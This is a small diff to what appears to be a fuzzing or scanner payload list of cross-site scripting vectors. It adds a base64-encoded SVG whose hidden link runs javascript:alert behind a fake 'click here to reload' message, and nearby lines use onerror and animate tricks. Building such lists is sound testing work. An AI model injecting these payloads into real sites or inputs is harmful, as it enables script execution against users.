@@ -7017,3 +7017,4 @@
 <xss_payload> = <lt>animate attributeName="xlink:href" begin="0" from="javascript:alert(137)" to="&" /<gt>
 <xss_payload> = <lt>/a<gt>//["'`--<gt>]]<gt>]<lt>/div<gt>
 <xss_payload> = <lt>div id="138"<gt><lt>link rel="import" href="test.svg" /<gt>//["'`--<gt>]]<gt>]<lt>/div<gt><lt>div id="139"<gt><lt>iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" /<gt>//["'`--<gt>]]<gt>]<lt>/div<gt>undefined
+<xss_payload> = <lt>svg<gt><lt>use href=data:application/xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJz4KPGEgaHJlZj0namF2YXNjcmlwdDphbGVydCgxMjMpJz4KICAgIDxyZWN0IHdpZHRoPScxMDAlJyBoZWlnaHQ9JzEwMCUnIGZpbGw9J2xpZ2h0Ymx1ZScgLz4KICAgICA8dGV4dCB4PScwJyB5PScwJyBmaWxsPSdibGFjayc+CiAgICAgICA8dHNwYW4geD0nMCcgZHk9JzEuMmVtJz5Pb3BzLCB0aGVyZSdzIHNvbWV0aGluZyB3cm9uZyB3aXRoIHRoZSBwYWdlITwvdHNwYW4+CiAgICAgPHRzcGFuIHg9JzAnIGR5PScxLjJlbSc+UGxlYXNlIGNsaWNrIGhlcmUgdG8gcmVsb2FkLjwvdHNwYW4+Cjwvc3ZnPg==#x<gt>
